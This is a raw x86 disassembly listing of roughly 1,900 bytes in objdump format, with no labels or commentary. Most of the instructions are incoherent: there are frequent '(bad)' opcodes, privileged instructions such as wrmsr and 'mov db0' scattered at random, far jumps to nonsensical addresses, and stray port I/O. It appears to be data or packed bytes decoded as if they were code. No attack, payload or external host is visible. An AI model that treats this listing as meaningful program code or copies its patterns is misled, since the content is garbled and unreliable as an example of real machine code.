  4303c1:	test   DWORD PTR [eax],eax
  4303c3:	wrmsr  
  4303c5:	ja     0x4303c2
  4303c7:	add    BYTE PTR [eax],al
  4303c9:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4303cf:	add    esp,edi
  4303d1:	add    BYTE PTR [eax+0x450108],al
  4303d7:	mov    edi,DWORD PTR [ebp-0x6c]
  4303da:	add    DWORD PTR [eax],0x4
  4303dd:	mov    eax,DWORD PTR [ebp+0x3]
  4303e0:	mov    edi,DWORD PTR [esp+edi*8]
  4303e3:	dec    ebp
  4303e4:	nop
  4303e5:	mov    eax,DWORD PTR [ecx]
  4303e7:	fadd   DWORD PTR [eax]
  4303e9:	add    BYTE PTR [ecx*4-0xafa000],dl
  4303f0:	inc    ebp
  4303f1:	push   edx
  4303f2:	call   DWORD PTR [ebp-0x7b]
  4303f5:	mov    esi,DWORD PTR [ebp-0x74]
  4303f8:	mov    eax,DWORD PTR [eax]
  4303fa:	cld    
  4303fb:	mov    eax,DWORD PTR [eax+0x880103]
  430401:	add    BYTE PTR [ebp+0x6a],bh
  430404:	cmp    edi,0x10
  430407:	mov    WORD PTR [ebp+0x0],es
  43040a:	mov    edx,DWORD PTR [edx-0x4]
  43040d:	push   ecx
  43040e:	nop
  43040f:	inc    DWORD PTR [ecx]
  430411:	cld    
  430412:	add    BYTE PTR [ebp-0x16],bh
  430415:	mov    eax,DWORD PTR [eax]
  430417:	cld    
  430418:	push   eax
  430419:	nop
  43041a:	inc    ebp
  43041b:	add    edi,edi
  43041d:	add    BYTE PTR [ebx+0x4de2f445],cl
  430423:	jmp    0xe33b:0x9403c733
  43042a:	movntq QWORD PTR [edx],mm7
  43042d:	mov    DWORD PTR [eax],0xb87e8b98
  430433:	test   ebx,eax
  430435:	jmp    DWORD PTR [ebp-0x1]
  430438:	int    0xed
  43043a:	sub    esp,esi
  43043c:	add    eax,DWORD PTR [ebp-0x30]
  43043f:	fild   WORD PTR [ebp+0x3f]
  430442:	cmp    eax,edi
  430444:	je     0xc043ea6a
  43044a:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  430451:	(bad)  
  430452:	jne    0x4303e0
  430454:	mov    ebx,ebp
  430456:	cld    
  430457:	jle    0x43049e
  430459:	dec    ecx
  43045a:	mov    eax,DWORD PTR [eax]
  43045c:	mov    ah,0x50
  43045e:	add    BYTE PTR [ebp-0x18],al
  430461:	mov    ebp,DWORD PTR [ecx]
  430463:	test   al,0x0
  430465:	add    BYTE PTR [ebx-0x7f170301],cl
  43046b:	add    DWORD PTR es:[eax],eax
  43046e:	add    al,al
  430470:	xor    BYTE PTR [eax+0x4f],dl
  430473:	inc    ebp
  430474:	add    BYTE PTR [ebx+0xfcd88b],cl
  43047a:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430480:	add    DWORD PTR [ecx+0x458be845],ecx
  430486:	fmul   DWORD PTR [ebx+0x8bb800]
  43048c:	cld    
  43048d:	call   0xd82f52
  430492:	dec    DWORD PTR [ebx+0x109ee8ff]
  430498:	add    al,al
  43049a:	push   eax
  43049b:	es inc ebp
  43049d:	inc    ebp
  43049e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  4304a4:	dec    DWORD PTR [ebx-0x3ff70301]
  4304aa:	mov    DWORD PTR gs:[eax],eax
  4304ad:	call   0x8c1349e7
  4304b2:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  4304b9:	sub    eax,ebx
  4304bb:	add    BYTE PTR [eax],al
  4304bd:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  4304c3:	inc    ebp
  4304c4:	push   ebp
  4304c5:	mov    ebp,eax
  4304c7:	shr    BYTE PTR [ecx],1
  4304c9:	ret    
  4304ca:	add    dh,al
  4304cc:	mov    eax,ecx
  4304ce:	cld    
  4304cf:	test   BYTE PTR [eax+0x101],al
  4304d5:	inc    ebp
  4304d6:	xor    BYTE PTR [ebx],dh
  4304d8:	push   edi
  4304d9:	mov    ecx,0xffe48d89
  4304de:	inc    ebp
  4304df:	enter  0x4d8b,0xfc
  4304e3:	mov    eax,ebx
  4304e5:	or     BYTE PTR [ebx+0x38732c1],bl
  4304eb:	add    DWORD PTR [ebp-0xbac000],ecx
  4304f1:	add    al,ch
  4304f3:	add    BYTE PTR [ecx],ch
  4304f5:	inc    DWORD PTR [eax]
  4304f7:	cld    
  4304f8:	mov    edi,DWORD PTR [ebp-0xc]
  4304fb:	mov    esi,DWORD PTR [ebp-0x4]
  4304fe:	xor    edx,DWORD PTR [eax+0x8d0103]
  430504:	and    BYTE PTR [ebp+0x50e800ff],bl
  43050a:	sub    DWORD PTR [ebp+0x0],eax
  43050d:	mov    edi,edi
  43050f:	test   al,0xe4
  430511:	add    BYTE PTR [ebp-0x1],cl
  430514:	xor    ebp,eax
  430516:	add    esp,DWORD PTR [esi]
  430518:	cmp    eax,DWORD PTR [eax]
  43051a:	jne    0x430569
  43051c:	(bad)  
  43051d:	mov    ebx,eax
  43051f:	pushf  
  430520:	add    BYTE PTR [eax],al
  430522:	add    BYTE PTR [ecx-0x37474bb],cl
  430528:	or     BYTE PTR [eax+0x8401c3],bh
  43052e:	fwait
  43052f:	jne    0x430563
  430531:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  430537:	inc    DWORD PTR [ebp-0x74d68b18]
  43053d:	add    BYTE PTR [eax+0x33fc4d8b],bh
  430543:	or     BYTE PTR [ebp+0x72000801],0x30
  43054a:	add    BYTE PTR [edi+0x45],dl
  43054d:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  430554:	gs test ebp,ecx
  430557:	je     0x430584
  430559:	mov    eax,DWORD PTR [ebx]
  43055b:	cld    
  43055c:	sar    BYTE PTR [eax+0x3b0145],1
  430562:	pcmpeqw mm4,mm2
  430565:	xor    edi,edi
  430567:	lea    ecx,[ebx-0x23927470]
  43056d:	add    BYTE PTR [ebp+0x50],cl
  430570:	cmp    eax,DWORD PTR [ebp+0x75]
  430573:	mov    ebp,DWORD PTR [eax-0x68]
  430576:	test   DWORD PTR [eax],eax
  430578:	clc    
  430579:	push   DWORD PTR [ebp-0x1]
  43057c:	lea    ecx,[eax]
  43057e:	int3   
  43057f:	inc    ebp
  430580:	call   0xfb3710
  430585:	jne    0x43057f
  430587:	xor    edi,DWORD PTR [ebp-0x41]
  43058a:	jmp    0x4305fe
  43058c:	mov    eax,DWORD PTR [eax]
  43058e:	mov    eax,0x339545c7
  430593:	inc    DWORD PTR [ebx]
  430595:	push   DWORD PTR [ecx]
  430597:	inc    ecx
  430598:	mov    eax,DWORD PTR [eax]
  43059a:	jmp    0x4305ec
  43059c:	mov    eax,DWORD PTR [ebp-0x3c]
  43059f:	mov    eax,eax
  4305a1:	cld    
  4305a2:	clc    
  4305a3:	ret    
  4305a4:	test   bh,al
  4305a6:	pop    es
  4305a7:	xchg   ebp,eax
  4305a8:	add    bh,bh
  4305aa:	inc    ebp
  4305ab:	dec    DWORD PTR [edi]
  4305ad:	sub    ebp,DWORD PTR [ebx]
  4305af:	add    BYTE PTR [eax],al
  4305b1:	push   eax
  4305b2:	jbe    0x430609
  4305b4:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  4305ba:	or     al,0xcf
  4305bc:	inc    eax
  4305bd:	enter  0x745,0x72
  4305c1:	inc    ebp
  4305c2:	mov    eax,DWORD PTR [ecx]
  4305c4:	int3   
  4305c5:	add    BYTE PTR [ebp-0x75],al
  4305c8:	xor    DWORD PTR [eax+0x33c74d9c],edi
  4305ce:	ror    BYTE PTR [ebp+0x72f80885],1
  4305d4:	inc    ebp
  4305d5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4305db:	fadd   st,st(6)
  4305dd:	rol    BYTE PTR [ebp+0x12],0x8b
  4305e1:	inc    ebp
  4305e2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4305e8:	inc    ebp
  4305e9:	test   bh,al
  4305eb:	fwait
  4305ec:	clc    
  4305ed:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4305f3:	inc    ebp
  4305f4:	xor    esi,DWORD PTR [ebx]
  4305f6:	pushf  
  4305f7:	mov    ecx,0xffb48dc7
  4305fc:	test   eax,ecx
  4305fe:	clc    
  4305ff:	dec    ebp
  430600:	inc    ebp
  430601:	mov    edi,DWORD PTR ds:0xc7c19c08
  430607:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43060e:	inc    ebp
  43060f:	inc    ebp
  430610:	aas    
  430611:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430618:	test   DWORD PTR [ecx],esi
  43061a:	clc    
  43061b:	pushf  
  43061c:	inc    ebp
  43061d:	dec    DWORD PTR [ebx-0x3cba0f04]
  430623:	push   eax
  430624:	mov    BYTE PTR [edx],0x7d
  430627:	add    BYTE PTR [ebx],bh
  430629:	mov    ecx,DWORD PTR [edi]
  43062b:	mov    DWORD PTR [eax],ebx
  43062d:	les    eax,FWORD PTR [eax]
  43062f:	adc    ebp,ecx
  430631:	dec    ebp
  430632:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  430638:	mov    ecx,esi
  43063a:	lock or al,cl
  43063d:	clc    
  43063e:	inc    ebp
  43063f:	add    esi,DWORD PTR [ebx]
  430641:	jge    0x430646
  430643:	xor    edi,DWORD PTR [ebx]
  430645:	cmp    ecx,DWORD PTR [edi]
  430647:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  43064c:	mov    edi,DWORD PTR [ecx]
  43064e:	test   al,0xcc
  430650:	dec    ebp
  430651:	test   BYTE PTR [ebx],dh
  430653:	pop    es
  430654:	xor    eax,DWORD PTR [eax]
  430656:	add    ecx,DWORD PTR [esi]
  430658:	add    ecx,eax
  43065a:	psraw  mm0,mm1
  43065d:	sub    BYTE PTR [ebp+0x38],cl
  430660:	mov    edi,DWORD PTR [ebx]
  430662:	lock int3 
  430664:	shl    edx,1
  430666:	rol    BYTE PTR [ebp+0xc],1
  430669:	mov    DWORD PTR [ebp-0x24],0xf8038533
  430670:	jmp    0x7506ba
  430675:	pushf  
  430676:	inc    ebp
  430677:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  43067d:	xor    ecx,ebx
  43067f:	add    ecx,esi
  430681:	mov    esi,eax
  430683:	enter  0x45af,0x8b
  430687:	xor    ecx,eax
  430689:	add    edx,DWORD PTR [ebp-0x77]
  43068c:	sub    ecx,DWORD PTR [eax]
  43068e:	cmp    eax,DWORD PTR [ebp+0x77]
  430691:	ror    DWORD PTR [ebx-0x76385764],1
  430697:	test   al,0x0
  430699:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43069f:	cmp    al,0x33
  4306a1:	pushf  
  4306a2:	xor    eax,edi
  4306a4:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  4306ab:	inc    ebp
  4306ac:	dec    ebp
  4306ad:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  4306b5:	test   DWORD PTR ds:0xeb4545f8,eax
  4306bb:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  4306c1:	fdiv   QWORD PTR [ebx]
  4306c3:	dec    ebp
  4306c4:	xor    esi,DWORD PTR [ebx]
  4306c6:	add    eax,DWORD PTR [ebx]
  4306c8:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  4306ce:	dec    ebp
  4306cf:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4306d5:	out    dx,eax
  4306d6:	rol    BYTE PTR [eax],1
  4306d8:	add    eax,0xebc8458b
  4306dd:	dec    ebp
  4306de:	mov    ebp,DWORD PTR [ebx]
  4306e0:	mov    esp,0x33f84d8b
  4306e5:	ret    
  4306e6:	xor    eax,esi
  4306e8:	add    ecx,eax
  4306ea:	add    eax,DWORD PTR [edx+0xc1010f]
  4306f0:	dec    ebp
  4306f1:	inc    ebp
  4306f2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4306f8:	ror    bl,1
  4306fa:	add    eax,0xebc645ce
  4306ff:	scas   eax,DWORD PTR es:[edi]
  430700:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430706:	xor    ebp,DWORD PTR [ebx]
  430708:	xor    edi,DWORD PTR [ebx]
  43070a:	add    esi,DWORD PTR [edi+0x3]
  43070d:	mov    ecx,DWORD PTR [edi]
  43070f:	clc    
  430710:	rol    ebx,0x4d
  430713:	(bad)  
  430714:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43071b:	mov    ah,0x45
  43071d:	dec    ebp
  43071e:	jbe    0x430753
  430720:	mov    esi,DWORD PTR [ebx]
  430722:	call   0x3346542a
  430727:	rdpmc  
  430729:	rol    DWORD PTR [ebx],0x4d
  43072c:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  430732:	inc    ebp
  430733:	ror    BYTE PTR [ebx+0x45450808],1
  430739:	jmp    0x10b07c9
  43073e:	inc    ebp
  43073f:	inc    ebp
  430740:	(bad)  
  430741:	mov    ebx,eax
  430743:	clc    
  430744:	test   ebx,eax
  430746:	clc    
  430747:	retf   
  430748:	inc    ebp
  430749:	into   
  43074a:	mov    esi,0x8b85afec
  430750:	clc    
  430751:	enter  0x5545,0x33
  430755:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  43075c:	ret    
  43075d:	mov    ah,0xc6
  43075f:	addr16 push 0x338b4545
  430765:	clc    
  430766:	add    eax,ebx
  430768:	loopne 0x430735
  43076a:	dec    ebp
  43076b:	into   
  43076c:	mov    al,dh
  43076e:	or     BYTE PTR [edi-0x37ff748e],ch
  430774:	inc    ebp
  430775:	push   ebp
  430776:	mov    ebp,DWORD PTR [ebx]
  430778:	in     al,dx
  430779:	cmp    eax,ebx
  43077b:	ja     0x4307c2
  43077d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430783:	inc    ebp
  430784:	fwait
  430785:	mov    esi,DWORD PTR [edx]
  430787:	clc    
  430788:	mov    bl,al
  43078a:	xlat   BYTE PTR ds:[ebx]
  43078b:	retf   
  43078c:	inc    ebp
  43078d:	into   
  43078e:	mov    eax,esi
  430790:	in     al,dx
  430791:	scas   eax,DWORD PTR es:[edi]
  430792:	retf   
  430793:	mov    ecx,DWORD PTR [ebp-0x38]
  430796:	mov    edx,DWORD PTR [ebp-0x24]
  430799:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  4307a0:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  4307a7:	mov    eax,DWORD PTR [ebx]
  4307a9:	clc    
  4307aa:	loopne 0x43076f
  4307ac:	push   ebp
  4307ad:	retf   
  4307ae:	mov    dh,al
  4307b0:	adc    esi,ecx
  4307b2:	jb     0x430763
  4307b4:	add    BYTE PTR [ebx+0x558bc845],cl
  4307ba:	in     al,dx
  4307bb:	sub    eax,ebx
  4307bd:	cmp    ecx,ebx
  4307bf:	mov    eax,esi
  4307c1:	mov    esp,0x45af03ce
  4307c6:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  4307cc:	mov    eax,ebx
  4307ce:	in     al,dx
  4307cf:	into   
  4307d0:	dec    ebp
  4307d1:	(bad)  
  4307d2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4307d8:	rol    DWORD PTR [ebp+0x4d],0x89
  4307dc:	xor    esp,esp
  4307de:	sub    eax,DWORD PTR [ebp-0x75]
  4307e1:	add    ebp,esp
  4307e3:	mov    al,0x55
  4307e5:	inc    ebp
  4307e6:	xor    esi,DWORD PTR [ecx]
  4307e8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4307ef:	inc    ebp
  4307f0:	xor    esi,DWORD PTR [edx]
  4307f2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4307f9:	test   DWORD PTR [eax],eax
  4307fb:	clc    
  4307fc:	enter  0x8645,0x33
  430800:	inc    DWORD PTR [ebx]
  430802:	(bad)  
  430803:	jmp    0x43084a
  430805:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43080b:	inc    ebp
  43080c:	(bad)  
  43080d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430813:	fwait
  430814:	retf   
  430815:	xor    al,cl
  430817:	mov    BYTE PTR [ebp+0xb],cl
  43081a:	lea    eax,[ebp+0x8]
  43081d:	xor    esi,DWORD PTR [edx+0x3]
  430820:	add    al,ah
  430822:	inc    ebp
  430823:	dec    ebp
  430824:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  43082a:	gs add ch,cl
  43082d:	inc    ebp
  43082e:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  430834:	inc    ebp
  430835:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  43083b:	push   ebp
  43083c:	(bad)  
  43083d:	mov    BYTE PTR [edi+0xf723b11],ch
  430843:	add    ch,ch
  430845:	inc    ebp
  430846:	dec    DWORD PTR [ebx-0x34332775]
  43084c:	add    al,0x4d
  43084e:	inc    ebp
  43084f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  430855:	fwait
  430856:	add    DWORD PTR [edx],esi
  430858:	add    BYTE PTR [ebx+0x4d00c000],cl
  43085e:	push   DWORD PTR [ebx]
  430860:	int3   
  430861:	xor    eax,DWORD PTR [eax]
  430863:	add    edx,DWORD PTR [eax+0x3]
  430866:	mov    DWORD PTR [edi],ecx
  430868:	call   0x4288c92e
  43086d:	mov    DWORD PTR [ebp-0x20],esp
  430870:	add    BYTE PTR [ebp+0x7d],al
  430873:	mov    eax,DWORD PTR [eax]
  430875:	in     al,0x15
  430877:	ret    
  430878:	iret   
  430879:	(bad)  
  43087a:	enter  0x14af,0x8b
  43087e:	(bad)  
  43087f:	in     al,dx
  430880:	or     bl,cl
  430882:	adc    cl,al
  430884:	push   ebp
  430885:	dec    ebp
  430886:	inc    eax
  430887:	mov    edx,DWORD PTR [ebp-0x20]
  43088a:	jb     0x430857
  43088c:	mov    ecx,esi
  43088e:	cld    
  43088f:	scas   eax,DWORD PTR es:[edi]
  430890:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430897:	mov    BYTE PTR [eax],0x8c
  43089a:	push   0xffffff9b
  43089c:	push   edi
  43089d:	xor    dl,BYTE PTR [eax+0x3b]
  4308a0:	mov    ecx,DWORD PTR [edi]
  4308a2:	call   0x8c424e05
  4308a7:	mov    eax,eax
  4308a9:	in     al,dx
  4308aa:	jge    0x4308f9
  4308ac:	mov    DWORD PTR [ebx],esi
  4308ae:	int3   
  4308af:	add    eax,DWORD PTR [ebp+0xf]
  4308b2:	xor    eax,ecx
  4308b4:	(bad)  
  4308b5:	dec    ebp
  4308b6:	pushf  
  4308b7:	xor    ecx,esi
  4308b9:	add    edi,DWORD PTR [edi]
  4308bb:	mov    eax,DWORD PTR [ebp-0x38]
  4308be:	(bad)  
  4308bf:	test   dh,dl
  4308c1:	fwait
  4308c2:	add    esi,DWORD PTR [edx]
  4308c4:	jmp    0x43084f
  4308c6:	mov    cl,al
  4308c8:	add    eax,0x14330f45
  4308cd:	mov    ecx,0xff468d80
  4308d2:	jmp    0xc990189f
  4308d7:	mov    edx,ecx
  4308d9:	rol    BYTE PTR [ebp+0x330155],1
  4308df:	add    ecx,DWORD PTR [ebp+0xf]
  4308e2:	xor    eax,edx
  4308e4:	(bad)  
  4308e5:	ror    DWORD PTR [eax],0x86
  4308e8:	jb     0x4308e7
  4308ea:	add    bh,bh
  4308ec:	clc    
  4308ed:	inc    ebp
  4308ee:	jb     0x43095a
  4308f0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4308f6:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  4308fc:	shr    BYTE PTR [eax-0x3d],0x30
  430900:	clc    
  430901:	add    BYTE PTR [ebp+0x75],al
  430904:	xor    DWORD PTR [edx-0x64],ebp
  430907:	inc    edi
  430909:	adc    al,0xe8
  43090b:	inc    ebp
  43090c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430912:	mov    ecx,DWORD PTR [eax]
  430914:	cld    
  430915:	or     DWORD PTR [ebp-0x34],0x33
  430919:	jbe    0x43091e
  43091b:	mov    edx,DWORD PTR [ecx+0x2b]
  43091e:	dec    ebp
  43091f:	mov    cl,BYTE PTR [ebx+0x45d801]
  430925:	mov    BYTE PTR [ebx],dh
  430927:	mov    eax,DWORD PTR [ebx]
  430929:	or     BYTE PTR [ecx+0x3b],dl
  43092c:	dec    ebp
  43092d:	int3   
  43092e:	xor    ebp,edi
  430930:	add    eax,DWORD PTR [ebp+0x51]
  430933:	mov    ecx,DWORD PTR [ebp-0x28]
  430936:	xor    eax,DWORD PTR [eax]
  430938:	add    ebp,DWORD PTR [eax+0x51]
  43093b:	adc    BYTE PTR [eax+0x0],0x8b
  43093f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  430945:	inc    ebp
  430946:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  43094c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  430952:	dec    ebp
  430953:	mov    esi,DWORD PTR [ebx]
  430955:	hlt    
  430956:	add    eax,ebx
  430958:	push   ecx
  430959:	inc    ebp
  43095a:	dec    ebp
  43095b:	(bad)  
  43095c:	call   esi
  43095e:	in     al,0xc7
  430960:	retf   
  430961:	mov    al,ds:0xc5ff3dce
  430966:	adc    al,0xc6
  430968:	inc    ebp
  430969:	and    eax,0x9c0f4c85
  43096e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  430975:	cmp    BYTE PTR [ebx+0x38],0x0
  430979:	mov    dh,0xc7
  43097b:	cmp    eax,eax
  43097d:	jne    0x454401c9
  430983:	mov    esi,DWORD PTR [ebx]
  430985:	mov    eax,0x848bcb9c
  43098a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430991:	or     BYTE PTR [edi],cl
  430993:	(bad)  
  430994:	dec    ebp
  430995:	inc    edi
  430996:	add    bh,0x54
  430999:	or     cl,ch
  43099b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4309a1:	add    BYTE PTR [eax-0x1638ab64],0xbc
  4309a8:	mov    BYTE PTR [ebp+0x45a5f802],dh
  4309ae:	(bad)  
  4309af:	cmp    eax,0x89839cff
  4309b4:	je     0x43099a
  4309b6:	inc    DWORD PTR [ebp+0x0]
  4309b9:	mov    ecx,DWORD PTR [ebp-0x340018]
  4309bf:	into   
  4309c0:	dec    DWORD PTR [ebx-0x7f72431c]
  4309c6:	push   0x5000ff01
  4309cb:	retf   
  4309cc:	inc    ebp
  4309cd:	into   
  4309ce:	dec    DWORD PTR [ebx-0x343f3ff4]
  4309d4:	push   eax
  4309d5:	into   
  4309d6:	call   0x4b0e66
  4309db:	retf   
  4309dc:	add    dh,cl
  4309de:	add    bh,bh
  4309e0:	mov    DWORD PTR [eax+ecx*1],edx
  4309e3:	clc    
  4309e4:	inc    ebp
  4309e5:	inc    ebp
  4309e6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4309ec:	push   0x1
  4309ee:	push   edi
  4309ef:	add    BYTE PTR [eax-0x35],dl
  4309f2:	mov    ecx,esi
  4309f4:	cld    
  4309f5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4309fb:	into   
  4309fc:	ror    BYTE PTR [ebx+0x75000800],0x50
  430a03:	xor    eax,DWORD PTR [ebp+0x3]
  430a06:	jne    0x430a59
  430a08:	call   DWORD PTR [eax-0x3c]
  430a0b:	mov    DWORD PTR [ecx-0x18],edx
  430a0e:	mov    edi,edi
  430a10:	call   0x8b464f99
  430a15:	add    ah,ah
  430a17:	rol    BYTE PTR [ebp-0x7c],0xeb
  430a1b:	add    edi,edi
  430a1d:	add    al,ch
  430a1f:	inc    ebp
  430a20:	push   ecx
  430a21:	cmp    al,0x8b
  430a23:	pushf  
  430a24:	(bad)  
  430a25:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  430a2c:	test   DWORD PTR [ebp-0x8],ecx
  430a2f:	add    BYTE PTR [ebp+0x54],0x32
  430a33:	jmp    0x8bcc92d4
  430a38:	in     al,dx
  430a39:	or     BYTE PTR [ebp-0xf],al
  430a3c:	xor    eax,DWORD PTR [eax+0x4f896503]
  430a42:	hlt    
  430a43:	mov    eax,DWORD PTR [ebp-0x50]
  430a46:	xor    esi,ecx
  430a48:	add    eax,DWORD PTR [eax+0x4f086589]
  430a4e:	inc    ebp
  430a4f:	adc    ecx,0x68
  430a52:	pushf  
  430a53:	inc    edi
  430a55:	add    al,ch
  430a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430a58:	test   edi,edi
  430a5a:	clc    
  430a5b:	inc    DWORD PTR [ebp-0x73]
  430a5e:	cmp    al,0x74
  430a60:	pushf  
  430a61:	inc    edi
  430a63:	push   ecx
  430a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a65:	jne    0x4309ec
  430a67:	push   eax
  430a68:	clc    
  430a69:	test   DWORD PTR [ebp-0x1],eax
  430a6c:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  430a74:	test   DWORD PTR [ebx+0x574510f8],eax
  430a7a:	cmp    BYTE PTR [edx],bl
  430a7c:	pushf  
  430a7d:	add    BYTE PTR [ebx+0x4d80e468],cl
  430a83:	add    BYTE PTR [ebx],dh
  430a85:	inc    ebp
  430a86:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430a8c:	enter  0x8401,0x0
  430a90:	add    al,BYTE PTR [eax]
  430a92:	add    bh,bh
  430a94:	out    dx,eax
  430a95:	sbb    BYTE PTR [eax],al
  430a97:	dec    ebp
  430a98:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  430a9e:	sub    esi,DWORD PTR [ebx]
  430aa0:	mov    ebp,DWORD PTR [eax-0x8]
  430aa3:	add    bl,0x0
  430aa6:	(bad)  
  430aa7:	cmp    eax,ecx
  430aa9:	or     BYTE PTR [edx+0x750114],al
  430aaf:	inc    DWORD PTR [ebp+0x18]
  430ab2:	mov    eax,DWORD PTR [ebp-0x8]
  430ab5:	mov    ebx,eax
  430ab7:	(bad)  
  430ab8:	retf   
  430ab9:	inc    ebp
  430aba:	into   
  430abb:	mov    esi,eax
  430abd:	int3   
  430abe:	scas   eax,DWORD PTR es:[edi]
  430abf:	push   es
  430ac0:	mov    esi,DWORD PTR [ebp-0xc]
  430ac3:	call   DWORD PTR [ebp+0x18]
  430ac6:	sub    edi,DWORD PTR [ebp+0x3b]
  430ac9:	mov    esi,DWORD PTR [edi-0x34]
  430acc:	mov    eax,DWORD PTR [ebp-0x8]
  430acf:	xor    ebx,eax
  430ad1:	pushf  
  430ad2:	mov    bh,0xbc
  430ad5:	fadd   QWORD PTR [eax]
  430ad7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  430add:	mov    esi,DWORD PTR [ebx]
  430adf:	in     al,0x33
  430ae1:	ret    
  430ae2:	add    eax,esi
  430ae4:	add    eax,DWORD PTR [ebp+0xf]
  430ae7:	mov    eax,ecx
  430ae9:	in     al,0x4d
  430aeb:	ret    
  430aec:	mov    eax,esi
  430aee:	in     al,dx
  430aef:	inc    ebp
  430af0:	rol    edi,1
  430af2:	sar    al,1
  430af4:	or     BYTE PTR [ebp+0x45e9f845],al
  430afa:	add    BYTE PTR [ebx],dh
  430afc:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430b03:	test   ebx,eax
  430b05:	clc    
  430b06:	retf   
  430b07:	inc    ebp
  430b08:	into   
  430b09:	cmp    eax,0xc7af9cc6
  430b0e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430b15:	inc    ebp
  430b16:	cmp    edi,DWORD PTR [edi]
  430b18:	ja     0x430ab6
  430b1a:	mov    eax,edi
  430b1c:	mov    esp,0x458567a8
  430b21:	clc    
  430b22:	mov    eax,DWORD PTR [ebp-0x8]
  430b25:	mov    eax,ebx
  430b27:	in     al,dx
  430b28:	retf   
  430b29:	ret    
  430b2a:	into   
  430b2b:	mov    dh,0x7d
  430b2e:	scas   eax,DWORD PTR es:[edi]
  430b2f:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  430b35:	add    BYTE PTR [ebx],ch
  430b37:	jmp    0xba0c77
  430b3c:	mov    eax,DWORD PTR [ebp-0x5c]
  430b3f:	mov    eax,DWORD PTR [ebp-0x14]
  430b42:	inc    ebp
  430b43:	enter  0x458b,0xf8
  430b47:	xor    eax,ebx
  430b49:	add    ecx,ebx
  430b4b:	cmp    ecx,esi
  430b4d:	shufps xmm7,xmm4,0xaf
  430b51:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430b57:	dec    ebp
  430b58:	sub    esi,DWORD PTR [ebx]
  430b5a:	cmp    esi,DWORD PTR [ebx]
  430b5c:	ja     0x430b61
  430b5e:	mov    eax,DWORD PTR [ebx]
  430b60:	lods   al,BYTE PTR ds:[esi]
  430b61:	mov    db0,ecx
  430b64:	inc    ebp
  430b65:	dec    ebp
  430b66:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430b6c:	retf   
  430b6d:	rol    dh,1
  430b6f:	or     al,0xce
  430b71:	inc    ebp
  430b72:	scas   eax,DWORD PTR es:[edi]
  430b73:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430b79:	add    BYTE PTR [ebx],ch
  430b7b:	add    BYTE PTR [ebx],bh
  430b7d:	inc    ebp
  430b7e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430b84:	inc    ebp
  430b85:	retf   
  430b86:	mov    ecx,esi
  430b88:	clc    
  430b89:	(bad)  
  430b8a:	retf   
  430b8b:	scas   eax,DWORD PTR es:[edi]
  430b8c:	ret    
  430b8d:	mov    ecx,esi
  430b8f:	hlt    
  430b90:	(bad)  
  430b91:	push   ebp
  430b92:	scas   eax,DWORD PTR es:[edi]
